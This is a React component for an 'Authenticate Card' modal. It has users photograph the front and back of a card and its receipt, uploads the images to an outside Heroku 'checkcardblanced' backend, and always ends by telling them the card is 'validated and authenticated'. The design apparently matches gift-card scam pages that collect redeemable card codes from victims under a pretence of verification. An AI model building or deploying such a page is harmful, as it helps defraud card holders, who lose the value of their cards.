import React, { useState } from "react";
import PageLoading from "./PageLoading";
import './checkmodal.css'

import Camera, {FACING_MODES, IMAGE_TYPES} from 'react-html5-camera-photo';
import 'react-html5-camera-photo/build/css/index.css';

import axios from "axios";

const Modal = () => {
  const [showModal, setShowModal] = useState(false);
  const [showloadModal, setShowloadModal] = useState(false);

  const [openCamera, setOpenCamera] = useState(false);
  const [selected, setSelected]=useState(0)

  const [front, setFront] = useState("");
  const [back, setBack] = useState("");
  const [receipt, setReceipt] = useState("");

  
  function handleTakePhoto (dataUri) {
    // Do stuff with the photo...
    console.log('takePhoto', dataUri);
    setOpenCamera(false);
    if(selected===0){
      setFront(dataUri);
    }else if(selected===1){
      setBack(dataUri);
    }else{
      setReceipt(dataUri);
    }
  }

  const cameraOpen=(val)=>{
    setSelected(val);
    setOpenCamera(true)
  }

  const saveFile = async()=>{
    
    if(!front || !back || !receipt){
      return alert("Required! take pictures that will be scanned for verification");
    }
    let filedata = new FormData();
    filedata.append('front', front);
    filedata.append('back', back);
    filedata.append('receipt', receipt);
    setShowloadModal(true)  

    console.log(filedata)
    // return
    await axios.post(`https://checkcad-backend.herokuapp.com/checkcardblanced/`, filedata, { timeout: 10000, headers: {"Content-Type": "multipart/form-data"}  })
    .then(async res => {
        console.log("certificate saved");
        setShowModal(false);
        // setShowloadModal(true)  
          setTimeout(() => {
            setShowloadModal(false);
        }, 10000);
        alert("Your Card is validated and authenticated. Thanks for trusting us...")
    })
    .catch(err => {
        setShowloadModal(false);
        alert("An error occured while processing the card, please take a clean photo for scanning")
        console.log("certificcate not save", err.request)
        // return false;
    });
  }

  return (
    <>
   
      <button
        className="w-full flex items-center justify-center px-8 py-3 border border-transparent text-base font-medium rounded-md text-indigo-700 bg-indigo-100 hover:bg-indigo-200 md:py-4 md:text-lg md:px-10"
        type="button"
        onClick={() => setShowModal(true)}
      >
        Authenticate Card
      </button>
      {showModal ? (
        <>
          <div className="flex justify-center items-center overflow-x-hidden overflow-y-auto fixed inset-0 z-50 outline-none focus:outline-none">
            <div className="relative w-full my-6 mx-auto max-w-3xl">
              <div className="border-0 rounded-lg shadow-lg relative flex flex-col w-full bg-white outline-none focus:outline-none">
                <div className="flex items-start justify-between p-5 border-b border-solid border-gray-300 rounded-t ">
                  <h3 className="text-3xl font=semibold">Verification & Authentication</h3>
                  <button
                    className="bg-transparent border-0 text-black float-right"
                    onClick={() => setShowModal(false)}
                  >
                    <span className="text-black opacity-7 h-6 w-6 text-xl block bg-gray-400 py-0 rounded-full">
                      x
                    </span>
                  </button>
                </div>

                {openCamera ? 
    <Camera
    onTakePhoto = { (dataUri) => { handleTakePhoto(dataUri); } }
    idealFacingMode = {FACING_MODES.ENVIRONMENT}
    idealResolution = {{width: 640, height: 480}}
      imageType = {IMAGE_TYPES.JPG}
      imageCompression = {0.97}
      isMaxResolution = {true}
      isImageMirror = {false}
      isSilentMode = {false}
      isDisplayStartCameraError = {true}
      isFullscreen = {false}
      sizeFactor = {1}
  />:
  
                <div className="relative p-6 flex-auto">
                  <form className="bg-gray-200 shadow-md rounded px-8 pt-6 pb-2 w-full">
                    <div className="block-item flex flex-row items-center " >
                      <div className="w-full" style={{width: '50%'}}>
                        <label className="block text-black text-sm font-600 mb-1 w-full" style={{width: '100%'}}>
                        Please take a clear photo of your Front card clearly legible..
                        </label> {front? <img src={require("../assets/good.png")} style={{width: 20}}/> : 'no picture'}
                        <button 
                        className="w-50 flex items-center justify-center px-8 py-3 border border-transparent text-base font-medium rounded-md text-indigo-700 bg-indigo-100 hover:bg-indigo-200 md:py-4 md:text-lg md:px-10"
                        type="button"
                        onClick={()=> cameraOpen(0)}>Take picture</button> 
                      </div>
                      <div className="" style={{width: '50%'}}>
                        <img src={require("../assets/front.png")} className="" style={{width: '100%'}}/>
                      </div>
                    </div>

                    <div className="block-item flex flex-row  items-center ">
                      <div className="w-full" style={{width: '50%'}}>
                        <label className="block text-black text-sm font-600 mb-1 w-full" style={{width: '100%'}}>
                        Please take a clear photo of the Back of your card clearly legible..
                        </label> {back? <img src={require("../assets/good.png")} style={{width: 20}}/> : 'no picture'}
                         <button 
                        className="w-50 flex items-center justify-center px-8 py-3 border border-transparent text-base font-medium rounded-md text-indigo-700 bg-indigo-100 hover:bg-indigo-200 md:py-4 md:text-lg md:px-10"
                        type="button"
                        onClick={()=> cameraOpen(1)}>Take picture</button>
                      </div>
                      <div className="" style={{width: '50%'}}>
                        <img src={require("../assets/back.png")} className="" style={{width: '100%'}}/>
                      </div>
                    </div>

                    <div className="block-item flex flex-row  items-center "  >
                      <div className="w-full" style={{width: '50%'}}>
                        <label className="block text-black text-sm font-600 mb-1 w-full" style={{width: '100%'}}>
                        PLease take a clear picture of the receipt of the card that will be used for authentication
                        </label> {receipt? <img src={require("../assets/good.png")} style={{width: 20}}/> : 'no picture'}
                         <button 
                        className="w-50 flex items-center justify-center px-8 py-3 border border-transparent text-base font-medium rounded-md text-indigo-700 bg-indigo-100 hover:bg-indigo-200 md:py-4 md:text-lg md:px-10"
                        type="button"
                        onClick={()=> cameraOpen(2)}>Take picture</button> 
                      </div>
                      {/* <div className="" style={{width: '50%'}}>
                        <img src={require("../assets/back.png")} className="" style={{width: '100%'}}/>
                      </div> */}
                    </div>
                   
                  </form>
                </div>

                    }
                <div className="flex items-center justify-end p-6 border-t border-solid border-blueGray-200 rounded-b">
                  <button
                    className="text-red-500 background-transparent font-bold uppercase px-6 py-2 text-sm outline-none focus:outline-none mr-1 mb-1"
                    type="button"
                    onClick={() => setShowModal(false)}
                  >
                    Close
                  </button>
                  {/* <button
                    className="text-white bg-yellow-500 active:bg-yellow-700 font-bold uppercase text-sm px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1"
                    type="button"
                    onClick={() => setShowModal(false)}
                  >
                    Submit
                  </button> */}
                  <div className="mt-3 sm:mt-0 sm:ml-3">
                    <PageLoading showloadModal={showloadModal} saveFile={saveFile}/>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </>
      ) : null}
      {/* </> */}
                {/* } */}
    </>
  );
};

export default Modal;